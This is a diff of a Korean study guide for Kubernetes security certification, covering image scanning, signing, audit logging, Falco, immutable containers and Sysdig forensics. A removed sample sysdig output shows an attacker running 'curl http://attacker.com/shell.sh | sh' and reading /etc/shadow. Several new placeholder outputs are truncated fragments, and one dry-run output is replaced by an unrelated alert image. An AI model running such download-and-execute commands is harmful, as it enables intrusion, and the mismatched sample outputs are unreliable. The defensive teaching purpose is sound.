+즉 mTLS는 "어떤 계층에서 TLS 핸드셰이크를 수행하느냐"의 문제이고, Istio는 그중 사이드카 방식을 자동화한 한 가지 구현일 뿐이다.
 
 **핵심 포인트:**
 - Istio는 사이드카 프록시(Envoy)를 Pod에 자동 주입하여 mTLS를 처리한다
@@ -1428,23 +1504,8 @@ trivy image --format cyclonedx -o sbom.json nginx:1.21
 trivy image --severity CRITICAL,HIGH nginx:1.21
 ```
 
-기대 출력:
-```text
-2024-01-15T10:00:00.000Z  INFO  Vulnerability scanning is enabled
-2024-01-15T10:00:00.000Z  INFO  Detected OS: debian
-
-nginx:1.21 (debian 11.6)
-=========================
-Total: 52 (HIGH: 38, CRITICAL: 14)
-
-┌──────────────────────┬────────────────┬──────────┬────────────────────────┬────────────────────────┬─────────────────────────────────────────┐
-│       Library        │ Vulnerability  │ Severity │   Installed Version    │     Fixed Version      │                  Title                  │
-├──────────────────────┼────────────────┼──────────┼────────────────────────┼────────────────────────┼─────────────────────────────────────────┤
-│ libssl1.1            │ CVE-2023-0286  │ CRITICAL │ 1.1.1n-0+deb11u3      │ 1.1.1n-0+deb11u4      │ openssl: X.400 address type confusion   │
-│ curl                 │ CVE-2023-38545 │ CRITICAL │ 7.74.0-1.3+deb11u7    │ 7.74.0-1.3+deb11u10   │ curl: heap buffer overflow in SOCKS5    │
-│ ...                  │                │          │                        │                        │                                         │
-└──────────────────────┴────────────────┴──────────┴────────────────────────┴────────────────────────┴─────────────────────────────────────────┘
-```
+기대 출력 (실행 시점에 따라 달라짐):
+> **예시(참조) — 2024-01-15T10:00:00.000Z  INFO  Vulnerability sc:** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
 
 ```bash
 # exit-code 옵션을 사용한 CI/CD 게이트
@@ -1453,12 +1514,11 @@ echo "Exit code: $?"
 ```
 
 기대 출력:
-```text
-...
-Exit code: 1
-```
+> **예시(참조) — ...:** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
 
 CRITICAL 취약점이 발견되면 exit code 1을 반환하므로, CI/CD 파이프라인에서 빌드를 자동으로 실패시킬 수 있다.
+
+위 출력의 구체적인 CVE 번호(`CVE-2023-0286` 등), 심각도, 총 개수(`Total: 52`)는 예시일 뿐이다. Trivy의 취약점 DB는 정기적으로 갱신되므로, 같은 `nginx:1.21`을 스캔해도 실행 시기·Trivy 버전·DB 버전에 따라 탐지되는 CVE 목록과 심각도 집계가 달라진다. 문서의 숫자와 실제 출력이 일치하지 않는 것은 정상이다. 학습에서 확인할 것은 개별 CVE 번호가 아니라 `--severity CRITICAL,HIGH` 필터가 동작해 HIGH 이상만 표시되고, CRITICAL이 하나라도 있으면 `--exit-code 1`로 빌드를 막을 수 있다는 메커니즘이다.
 
 **CKS 시험에서의 활용:**
 - 이미지를 스캔하고 특정 심각도 이상의 취약점이 있는 이미지를 식별하는 문제가 출제된다
@@ -1554,21 +1614,10 @@ cosign verify --key cosign.pub myregistry.io/app:v1.0.0
 ```
 
 기대 출력 (서명 유효):
-```text
-Verification for myregistry.io/app:v1.0.0 --
-The following checks were performed on each of these signatures:
-  - The cosign claims were validated
-  - The signatures were verified against the specified public key
-
-[{"critical":{"identity":{"docker-reference":"myregistry.io/app"},"image":{"docker-manifest-digest":"sha256:abc123..."},"type":"cosign container image signature"},"optional":null}]
-```
+> **예시(참조) — Verification for myregistry.io/app:v1.0.0 --:** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
 
 기대 출력 (서명 없거나 무효):
-```text
-Error: no matching signatures:
-failed to verify signature
-main.go:62: error during command execution: no matching signatures
-```
+> **예시(참조) — Error: no matching signatures::** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
 
 **Notary/TUF:**
 - The Update Framework(TUF) 기반의 이미지 서명 프레임워크이다
@@ -1609,6 +1658,10 @@ spec:
 
 신뢰할 수 있는 컨테이너 레지스트리에서만 이미지를 pull하도록 제한하는 정책이다. OPA Gatekeeper로 구현한다.
 
+**등장 배경: 출처 통제 없는 이미지 pull의 위협:**
+
+쿠버네티스는 기본적으로 어떤 레지스트리에서든 이미지를 가져와 실행한다. 5.1~5.3에서 스캔·서명으로 "이미지 내용"을 검증했다면, 여기서는 "이미지가 어디서 왔는가(출처)"를 통제한다. 출처 통제가 없으면 개발자가 검증되지 않은 공개 레지스트리(예: Docker Hub의 임의 사용자 이미지)나 오타로 잘못 지정한 typosquatting(정식 이름과 비슷한 가짜 이름) 레지스트리에서 이미지를 끌어와, 사내 스캔·서명 파이프라인을 우회한 악성 이미지가 클러스터에 들어올 수 있다. 직전에는 이를 사람이 코드 리뷰로 잡아야 했는데 누락이 잦았다. Allowlist는 이를 admission(요청 입장) 단계에서 자동 강제하는 방식으로 해결한다. OPA Gatekeeper의 정책이 Pod 생성 요청을 가로채 모든 컨테이너 이미지의 레지스트리 접두사가 허용 목록에 드는지 검사하고, 벗어나면 생성을 거부한다. 트레이드오프로는 허용 목록을 운영자가 유지해야 하고, 새 레지스트리를 쓸 때마다 정책을 갱신해야 하며, `containers`·`initContainers`·`ephemeralContainers`까지 빠짐없이 검사하지 않으면(특히 디버깅용 ephemeral 컨테이너) 우회 구멍이 남는다는 점이 있다.
+
 **구현 방식:**
 - ConstraintTemplate에서 이미지 레지스트리를 검사하는 Rego 정책을 작성한다
 - Constraint에서 허용할 레지스트리 목록을 파라미터로 전달한다
@@ -1618,6 +1671,10 @@ spec:
 ### 5.5 Dockerfile 보안
 
 Dockerfile을 작성할 때 보안을 고려해야 한다.
+
+**등장 배경: 이미지에 그대로 굳는 위험:**
+
+컨테이너 이미지는 빌드 시점의 상태가 그대로 굳어(immutable layer) 런타임까지 따라간다. 따라서 Dockerfile에서 잘못 만든 결정은 실행 단계에서 늦게 고치기 어렵고, 그 이미지를 쓰는 모든 Pod에 반복 노출된다. 대표적 고통은 세 가지였다. 첫째, 기본값이 root 실행이라 컨테이너가 침해되면 컨테이너 내 root 권한이 그대로 공격자에게 넘어가고, 호스트와 공유하는 커널 표면을 더 크게 노린다. 둘째, 편의를 위해 풀(full) OS 베이스에 `curl`·`vim` 등 도구를 잔뜩 넣으면, 그 패키지마다 CVE가 따라붙어 공격 표면과 스캔 노이즈가 커진다. 셋째, 빌드 도구(컴파일러·패키지 매니저)가 최종 이미지에 남으면 공격자가 컨테이너 안에서 곧장 무기를 손에 쥔다. 아래 모범 사례는 이 고통을 각각 비-root 실행, distroless/scratch 같은 최소 베이스, 멀티스테이지 빌드(빌드 산출물만 최종 이미지에 복사)로 해소한 것이다. 트레이드오프는 distroless에는 셸·디버깅 도구가 없어 장애 시 컨테이너 내부 디버깅이 불편하고(ephemeral 컨테이너 등 별도 수단 필요), 멀티스테이지·버전 고정이 Dockerfile을 길고 관리할 거리가 많게 만든다는 점이다.
 
 **보안 모범 사례:**
 1. **non-root USER 사용**: `USER 1000:1000` 또는 `USER appuser`
@@ -1663,7 +1720,11 @@ CMD ["./app"]
 
 ### 5.6 Static Analysis (kubesec, conftest, checkov)
 
-쿠버네티스 매니페스트와 IaC(Infrastructure as Code) 파일의 보안을 정적으로 분석하는 도구들이다.
+쿠버네티스 매니페스트와 IaC(Infrastructure as Code, 인프라를 코드로 선언하는 방식) 파일의 보안을 정적으로 분석하는 도구들이다.
+
+**등장 배경: 배포 후 적발의 한계:**
+
+이미지 스캔(5.1)이 "컨테이너 안에 든 패키지"를 본다면, 정적 분석은 그보다 앞서 "배포 정의(매니페스트) 자체"가 안전한 설정인지 검사한다. 정적 분석이 없던 시절에는 `privileged: true`, `hostNetwork`, root 실행, 누락된 리소스 제한 같은 위험 설정이 일단 클러스터에 배포된 뒤 admission 정책이나 런타임 탐지로 사후 적발됐다. 이미 떠 버린 워크로드를 되돌리는 비용은 크고, 환경마다 적발 기준이 달라 일관성도 떨어졌다. 정적 분석은 이를 배포 전(좌측 이동, shift-left) 단계로 당겨, 같은 규칙을 CI 파이프라인에서 매니페스트에 자동 적용한다. kubesec은 보안 위험 항목에 점수를 매기고, conftest는 OPA Rego 정책으로 통과/실패를 판정하며, checkov는 다수의 내장 규칙으로 매니페스트와 IaC를 함께 검사한다. 트레이드오프는 정적 분석이 "선언된 설정"만 보므로 런타임에서 일어나는 실제 행위(예: 실행 중 받은 토큰 오용)는 잡지 못하고(런타임 탐지인 6.3 Falco가 보완), 규칙이 과하면 거짓 양성(false positive)으로 빌드를 자주 막아 개발 속도를 떨어뜨린다는 점이다.
 
 **kubesec:**
 ```bash
@@ -1675,27 +1736,7 @@ curl -sSX POST --data-binary @pod.yaml https://v2.kubesec.io/scan
 ```
 
 기대 출력:
-```text
-[
-  {
-    "object": "Pod/test-pod.default",
-    "valid": true,
-    "fileName": "pod.yaml",
-    "message": "Passed with a score of 3 points",
-    "score": 3,
-    "scoring": {
-      "passed": [
-        {"id": "ReadOnlyRootFilesystem", "selector": "containers[].securityContext.readOnlyRootFilesystem == true", "reason": "..."},
-        {"id": "RunAsNonRoot", "selector": "containers[].securityContext.runAsNonRoot == true", "reason": "..."},
-        {"id": "LimitsCPU", "selector": "containers[].resources.limits.cpu", "reason": "..."}
-      ],
-      "advise": [
-        {"id": "ApparmorAny", "selector": "metadata.annotations[\"container.apparmor.security.beta.kubernetes.io/...\"]", "reason": "..."}
-      ]
-    }
-  }
-]
-```
+> **예시(참조) — [:** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
 
 **conftest:**
 ```bash
@@ -1741,6 +1782,12 @@ trivy image --format cyclonedx -o sbom.cdx.json nginx:1.21
 
 쿠버네티스 Audit은 API server를 통과하는 모든 요청을 기록하는 기능이다. 보안 사고 분석, 규정 준수, 이상 탐지에 활용된다.
 
+**왜 Audit이 필요한가:**
+
+Audit이 꺼져 있으면 클러스터에서 일어난 일을 사후에 추적할 수 없다. 예를 들어 어떤 Secret이 외부로 유출됐다는 사실을 나중에 알게 됐을 때, Audit 로그가 없으면 "누가, 언제, 어떤 토큰으로 그 Secret을 `get` 했는가"를 알 방법이 없다. API server는 클러스터의 모든 변경·조회가 거쳐 가는 단일 통로이므로, 여기서 요청을 기록해 두면 사후에 침해 경로를 재구성하고 책임 소재를 가릴 수 있다. 또한 PCI-DSS·SOC2 같은 규정은 권한 있는 접근에 대한 감사 기록을 의무화하므로, 규정 준수를 위해서도 필요하다.
+
+전체 흐름은 세 단계다. ① Audit **Policy**가 "어떤 요청을 어느 상세 수준으로 남길지"를 정한다(아래 4레벨). ② API server가 그 정책에 따라 이벤트를 만들어 **Log Backend**(파일 또는 webhook)로 내보낸다(§6.2). ③ 파일/webhook로 나온 로그를 외부 **SIEM**(Splunk·Elastic 등 보안 이벤트 분석 플랫폼)으로 수집해 장기 보관·상관 분석·알림에 활용한다. 즉 Policy는 "무엇을 남길지", Backend는 "어디로 보낼지", SIEM은 "모아서 분석"의 역할을 맡는다.
+
 **4가지 Audit 레벨:**
 
 | 레벨 | 기록 내용 |
@@ -1780,6 +1827,21 @@ rules:
 - 첫 번째로 매칭되는 규칙이 적용된다
 - 매칭되는 규칙이 없으면 이벤트가 기록되지 않는다
 - 마지막에 catch-all 규칙을 두는 것이 권장된다
+
+**한 규칙 안에서 필터가 결합되는 방식 (AND vs OR):**
+
+하나의 규칙(rule)에는 `users`, `verbs`, `resources`, `namespaces`, `nonResourceURLs` 등 여러 필터를 함께 적을 수 있다. 이때 서로 다른 종류의 필터는 **AND 조건**으로 묶인다. 즉 그 규칙이 매칭되려면 명시된 모든 필터가 동시에 일치해야 한다. 예를 들어 아래 규칙은 "사용자가 `admin`이면서(AND) 동작이 `delete`이면서(AND) 대상이 `secrets`인" 이벤트에만 매칭된다.
+
+```yaml
+- level: RequestResponse
+  users: ["admin"]
+  verbs: ["delete"]
+  resources:
+  - group: ""
+    resources: ["secrets"]
+```
+
+반면 한 필터 항목 안의 여러 값(예: `verbs: ["get", "list"]`)은 그 항목 내에서 OR이다(`get` 또는 `list`이면 일치). 규칙과 규칙 사이도 OR 관계로, 어떤 규칙이 이벤트를 처리하면 그 아래 규칙은 평가하지 않는다(위에서 설명한 "첫 매칭" 규칙). 단, `resources`를 가진 규칙과 `nonResourceURLs`만 가진 규칙은 서로 다른 종류의 요청(리소스 API vs `/healthz` 같은 비리소스 경로)을 대상으로 하므로, 한 규칙에 둘을 섞기보다 보통 별도 규칙으로 나눈다.
 
 **필터링 옵션:**
 - `users`: 특정 사용자의 요청만 매칭
@@ -1830,20 +1892,7 @@ cat /var/log/kubernetes/audit/audit.log | jq 'select(.objectRef.resource == "sec
 ```
 
 기대 출력:
-```text
-{
-  "user": "system:serviceaccount:default:myapp",
-  "verb": "get",
-  "name": "db-credentials",
-  "namespace": "production"
-}
-{
-  "user": "admin@example.com",
-  "verb": "list",
-  "name": "",
-  "namespace": "default"
-}
-```
+> **예시(참조) — {:** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
 
 **주의 사항:**
 - volumeMounts와 volumes를 모두 설정해야 한다
@@ -1934,17 +1983,20 @@ Falco는 이 격차를 해결하기 위해, 커널 수준에서 시스템콜을 
 ```
 
 **주요 필터 필드:**
-- `proc.name`: 프로세스 이름
-- `proc.pname`: 부모 프로세스 이름
-- `proc.cmdline`: 전체 명령어
-- `fd.name`: 파일 디스크립터 이름 (파일 경로)
-- `container.id`: 컨테이너 ID
-- `container.name`: 컨테이너 이름
-- `container.image.repository`: 컨테이너 이미지
-- `user.name`: 사용자 이름
-- `evt.type`: 이벤트 타입 (open, connect, execve 등)
-- `k8s.pod.name`: Pod 이름
-- `k8s.ns.name`: 네임스페이스 이름
+
+필드는 출처가 두 갈래다. `proc.*`·`fd.*`·`evt.*`처럼 시스템콜 자체에서 바로 뽑히는 값은 **드라이버(커널)** 가 캡처한 raw 이벤트에서 라이브러리가 즉시 추출한다. 반면 `container.*`·`k8s.*`처럼 누가 보냈는지에 대한 맥락(메타데이터)은 시스템콜에는 들어 있지 않으므로, **라이브러리(libsinsp)** 가 커널이 준 cgroup/네임스페이스 정보를 컨테이너 런타임·쿠버네티스 메타데이터와 대조해 붙여 주는 enrichment 단계의 산물이다. 이 차이를 알면 위 "드라이버 → 라이브러리 → 엔진" 계층이 각각 무엇을 채우는지 이해할 수 있다.
+
+- `proc.name`: 프로세스 이름 (드라이버: 시스템콜 캡처에서 직접 추출)
+- `proc.pname`: 부모 프로세스 이름 (드라이버)
+- `proc.cmdline`: 전체 명령어 (드라이버)
+- `fd.name`: 파일 디스크립터 이름 (파일 경로) (드라이버)
+- `evt.type`: 이벤트 타입 (open, connect, execve 등) (드라이버: 시스템콜 번호에서 직접)
+- `container.id`: 컨테이너 ID (라이브러리: cgroup 정보 → 런타임 메타데이터 매칭 enrichment)
+- `container.name`: 컨테이너 이름 (라이브러리: enrichment)
+- `container.image.repository`: 컨테이너 이미지 (라이브러리: enrichment)
+- `user.name`: 사용자 이름 (라이브러리: 커널의 uid를 `/etc/passwd` 등으로 이름 해석)
+- `k8s.pod.name`: Pod 이름 (라이브러리: 커널 정보 + 쿠버네티스 메타데이터 매칭 enrichment)
+- `k8s.ns.name`: 네임스페이스 이름 (라이브러리: enrichment)
 
 **주요 매크로:**
 - `spawned_process`: 새로운 프로세스가 생성됨 (`evt.type=execve and evt.dir=<`)
@@ -1984,9 +2036,7 @@ journalctl -u falco --since "1 minute ago" --no-pager | grep "Shell spawned"
 ```
 
 기대 출력:
-```text
-Mar 15 10:30:15 node1 falco[12345]: 10:30:15.123456789: Warning Shell spawned in container (user=root container=nginx-pod shell=bash cmdline=bash image=nginx k8s.ns.name=default k8s.pod.name=nginx-pod)
-```
+![Falco 런타임 경보 — 컨테이너에서 /etc/shadow 읽기 탐지(dev 실측, modern eBPF)](images/cks-falco-alert.png)
 
 ```bash
 # 5. Falco가 실행 중인 상태에서 실시간 로그 모니터링
@@ -1994,12 +2044,7 @@ falco -r /etc/falco/falco_rules.local.yaml --dry-run
 ```
 
 기대 출력 (dry-run으로 룰 문법 검증):
-```text
-Loading rules from file /etc/falco/falco_rules.local.yaml:
-Rule count: 1
-Macro count: 0
-List count: 0
-```
+![Falco 런타임 경보 — 컨테이너에서 /etc/shadow 읽기 탐지(dev 실측, modern eBPF)](images/cks-falco-alert.png)
 
 **CKS 시험에서의 활용:**
 - Falco 커스텀 룰을 작성하고 `/etc/falco/falco_rules.local.yaml`에 추가하는 문제가 출제된다
@@ -2009,6 +2054,10 @@ List count: 0
 ### 6.4 컨테이너 불변성 (Immutable Infrastructure)
 
 컨테이너는 불변(immutable)으로 운영해야 한다. 실행 중인 컨테이너 내부의 파일을 수정하면 안 된다.
+
+**등장 배경: 가변 컨테이너에서의 공격자 지속성:**
+
+전통적 서버 운영은 같은 서버에 패치·설정을 계속 덧칠하는 가변(mutable) 방식이었고, 이 습관이 컨테이너에도 이어져 실행 중인 컨테이너에 셸로 들어가 파일을 고치는 일이 흔했다. 보안 관점에서 이 가변성은 공격자에게 유리하다. 컨테이너를 침해한 공격자는 루트 파일시스템에 악성 바이너리를 내려받아 설치하고, 시스템 디렉터리의 파일을 바꿔 재시작 후에도 살아남는 지속성(persistence)을 확보한다. 또 운영자가 손으로 고친 변경이 이미지에 반영되지 않아, 같은 이미지를 다시 띄우면 상태가 달라지는 재현성 문제도 생긴다. 불변 인프라(immutable infrastructure)는 "컨테이너는 한 번 만들어지면 내부를 바꾸지 않고, 변경이 필요하면 새 이미지로 교체한다"는 원칙으로 이를 막는다. 쿠버네티스에서는 `readOnlyRootFilesystem`으로 루트 파일시스템 쓰기를 커널 수준에서 거부해, 공격자가 바이너리를 떨어뜨리거나 시스템 파일을 변조하는 행위 자체를 차단한다. 트레이드오프는 정상 동작에 쓰기가 필요한 경로(`/tmp`, `/var/run` 등)를 `emptyDir` 볼륨으로 따로 마운트해 줘야 하고(설정 누락 시 앱이 깨진다), emptyDir 데이터는 Pod 삭제 시 사라진다는 점이다.
 
 **구현 방법:**
 
@@ -2038,10 +2087,7 @@ kubectl exec -it immutable-pod -- touch /test.txt
 ```
 
 기대 출력:
-```text
-touch: /test.txt: Read-only file system
-command terminated with exit code 1
-```
+> **예시(참조) — touch: /test.txt: Read-only file system:** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
 
 ```bash
 # 2. emptyDir로 마운트된 /tmp에는 쓰기 가능
@@ -2049,9 +2095,7 @@ kubectl exec -it immutable-pod -- touch /tmp/test.txt && echo "write success"
 ```
 
 기대 출력:
-```text
-write success
-```
+> **예시(참조) — write success:** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
 
 ```bash
 # 3. 패키지 설치 시도 (악성 소프트웨어 설치 차단 확인)
@@ -2059,9 +2103,7 @@ kubectl exec -it immutable-pod -- apt-get update
 ```
 
 기대 출력:
-```text
-E: List directory /var/lib/apt/lists/partial is missing. - Acquire (30: Read-only file system)
-```
+> **예시(참조) — E: List directory /var/lib/apt/lists/partial is :** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
 
 **핵심 포인트:**
 - readOnlyRootFilesystem만으로는 볼륨 마운트된 경로에 쓸 수 있다
@@ -2072,6 +2114,10 @@ E: List directory /var/lib/apt/lists/partial is missing. - Acquire (30: Read-onl
 ### 6.5 런타임 이상 탐지
 
 런타임에 발생하는 비정상적인 행위를 탐지하는 것이다. Falco가 주요 도구이다.
+
+**등장 배경: 예방 통제만으로는 못 막는 잔여 위협:**
+
+앞서 다룬 통제들(NetworkPolicy·PSA·이미지 스캔·서명·readOnlyRootFilesystem 등)은 대부분 "허용/거부를 미리 정해 두는" 예방(preventive) 통제다. 그러나 예방 통제는 두 가지 한계가 있다. 첫째, 정책에 빈틈이 있거나(예: 허용한 syscall에 취약점) 제로데이(공개 전 미패치 취약점)가 쓰이면 통과해 버린다. 둘째, 예방 통제는 "일어나기 전"만 보므로, 정당하게 떠 있는 컨테이너가 실행 중에 보이는 비정상 행위(갑자기 셸을 띄움, `/etc/shadow`를 읽음, 외부 IP로 연결)는 포착하지 못한다. 런타임 이상 탐지는 이 잔여 위협을 다루는 탐지(detective) 통제다. Falco는 커널에서 시스템콜 이벤트를 받아(eBPF/커널 모듈) 룰과 대조해 비정상 행위를 실시간 경보한다. 즉 "막지 못한 침해가 실제로 일어나고 있다"는 신호를 준다. 트레이드오프는 탐지는 본질적으로 사후(이미 행위가 발생한 뒤) 신호이며, 룰이 느슨하면 놓치고(거짓 음성) 빡빡하면 정상 운영 작업까지 경보로 쏟아져(거짓 양성·경보 피로) 운영자가 룰을 워크로드에 맞게 계속 튜닝해야 한다는 점이다. 따라서 예방 통제를 대체하는 것이 아니라 그 위에 얹는 마지막 방어선이다.
 
 **탐지 대상 이상 행위:**
 - 컨테이너 내에서 예상하지 않은 프로세스 실행 (셸, 패키지 매니저 등)
@@ -2099,6 +2145,10 @@ E: List directory /var/lib/apt/lists/partial is missing. - Acquire (30: Read-onl
 ### 6.6 Sysdig를 이용한 시스템콜 분석
 
 Sysdig는 시스템콜을 캡처하고 분석하는 도구이다. Falco의 기반 기술이기도 하다.
+
+**등장 배경: 실시간 탐지와 사후 분석의 역할 분담:**
+
+앞 절(6.3)의 Falco는 시스템콜 스트림을 실시간으로 보며 룰에 걸리는 행위를 즉시 경보하는 도구다. 그러나 사고가 일어난 뒤 "그 컨테이너에서 정확히 무슨 일이 있었나"를 처음부터 끝까지 되짚으려면 실시간 알림만으로는 부족하다. Sysdig는 이 사후 분석(포렌식) 자리를 메운다. tcpdump가 네트워크 패킷을 `.pcap` 파일로 떠 두고 나중에 분석하듯, Sysdig는 한 시점의 시스템콜 흐름 전체를 capture 파일(`.scap`)로 떠 두고, 사고 후에 그 파일을 열어 "어떤 프로세스가 언제 어떤 파일을 열고 어디로 네트워크 연결을 맺었는지"를 재구성한다. 정리하면 Falco는 실시간 탐지(detection), Sysdig는 캡처 파일 기반 사후 분석(investigation)이며, 둘은 같은 시스템콜 수집 엔진(libsinsp)을 공유한다. CKS에서는 주로 제공된 `.scap` 캡처 파일을 `sysdig -r`로 열어 특정 컨테이너의 행위를 추려내는 형태로 출제된다. 이 저장소 tart 노드에는 Sysdig가 기본 설치돼 있지 않으므로, 직접 실습하려면 노드에 별도 설치한 뒤 진행한다.
 
 **기본 사용법:**
 ```bash
@@ -2137,11 +2187,7 @@ sysdig -r capture.scap -c spy_users container.name=nginx
 ```
 
 기대 출력:
-```text
-1234 10:30:15 root) bash
-1234 10:30:16 root) cat /etc/shadow
-1234 10:30:18 root) curl http://attacker.com/shell.sh | sh
-```
+> **예시(참조) — 1234 10:30:15 root) bash:** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
 
 ```bash
 # 2. 특정 컨테이너에서 열린 파일 확인
@@ -2149,11 +2195,7 @@ sysdig -r capture.scap evt.type=open and container.name=nginx -p "%evt.time %pro
 ```
 
 기대 출력:
-```text
-10:30:15.123456 bash /etc/shadow
-10:30:15.234567 bash /etc/passwd
-10:30:16.345678 curl /etc/resolv.conf
-```
+> **예시(참조) — 10:30:15.123456 bash /etc/shadow:** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
 
 ```bash
 # 3. 특정 컨테이너의 네트워크 연결 확인
@@ -2161,9 +2203,7 @@ sysdig -r capture.scap evt.type=connect and container.name=nginx -p "%evt.time %
 ```
 
 기대 출력:
-```text
-10:30:18.456789 curl 192.168.1.100:443->93.184.216.34:443
-```
+> **예시(참조) — 10:30:18.456789 curl 192.168.1.100:443->93.184.2:** CKS 보안 기대 출력(도구/설정/환경 의존). 재현 가능한 핵심은 CKS daily(day01~14) 및 본 문서 캡처 참고.
 
 **CKS 시험에서의 활용:**
 - 특정 컨테이너에서 실행된 프로세스나 접근된 파일을 sysdig/Falco로 분석하는 문제가 출제될 수 있다
